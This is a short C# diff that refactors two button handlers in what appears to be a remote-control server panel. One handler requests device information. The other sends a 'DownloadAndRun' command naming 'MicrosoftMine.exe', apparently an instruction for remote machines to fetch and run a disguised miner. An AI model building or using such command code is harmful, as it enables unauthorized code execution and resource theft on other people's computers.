@@ -37,8 +37,8 @@ namespace ServerWorker
         private void button2_Click(object sender, EventArgs e)
         {
             Functions.OnGettingInfoDevice += () => Test(messenger.setting.infoDevice);
-            byte[] data = Encoding.Unicode.GetBytes("GetInfoDevice");
-            messenger.authStream.Write(data, 0, data.Length);
+            string message = "GetInfoDevice";
+            messenger.SendMessage(message);
         }
 
         private void Test(List<string> test)
@@ -59,8 +59,8 @@ namespace ServerWorker
 
         private void button3_Click(object sender, EventArgs e)
         {
-            byte[] data = Encoding.Unicode.GetBytes("DownloadAndRun"+"_"+"MicrosoftMine.exe");
-            messenger.authStream.Write(data, 0, data.Length);
+            string message = "DownloadAndRun"+"_"+"MicrosoftMine.exe";
+            messenger.SendMessage(message);
         }
     }
 }
